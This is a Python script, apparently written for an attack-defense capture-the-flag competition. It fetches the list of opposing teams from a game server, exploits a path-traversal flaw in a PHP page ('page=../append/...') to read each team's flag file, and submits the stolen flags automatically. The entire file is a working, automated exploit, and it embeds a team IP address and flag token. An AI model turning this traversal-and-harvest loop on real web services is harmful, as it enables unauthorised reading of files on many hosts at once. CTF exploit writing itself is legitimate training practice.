#!/usr/bin/env python3
import requests
import swpag_client

TEAM_IP = "52.37.204.0"                             # Update according to team ip address
TEAM_FLAG_TOKEN = "ZOGR9UqlRWFg8wLJB3aj"            # Update according to team flag token
SERVICE_ID = 2                                      # Update for each exploit to target the correct service
EXCLUDE_TEAM_NAME = "Bindevil"                      # Team name
EXCLUDE_HOSTNAME = "team19"                         # Team hostname
TEAM_URL = "http://" + TEAM_IP + "/"

def main():
  try:
    team = swpag_client.Team(TEAM_URL, TEAM_FLAG_TOKEN)
    for target in team.get_targets(SERVICE_ID):
      flag_id = target["flag_id"]
      hostname = target["hostname"]
      port = target["port"]
      
      # Ignore our own team
      if target["team_name"] == EXCLUDE_TEAM_NAME or hostname == EXCLUDE_HOSTNAME:
        continue

      print("Running exploit on {0}:{1} -> {2}".format(hostname, port, flag_id))

      # Generatae HTTP GET Request
      httpGetStr = "http://" + hostname + ":" + str(port) + \
                  "/index.php?page=../append/" + flag_id + ".json"

      try:
        r = requests.get(httpGetStr, timeout=0.5)

        if "FLG" in r.content:
          # convert to json format and encode utf-8 to ascii
          r_dict = r.json()
          flag = r_dict['message'].encode("ascii", "replace")

          # submit flag
          print(team.submit_flag([flag]))

      except Exception:
        print
        "Timeout on", target['hostname'], target['team_name']
        continue
  except Exception as e:
    print(e)      

if __name__ == "__main__":
  main()

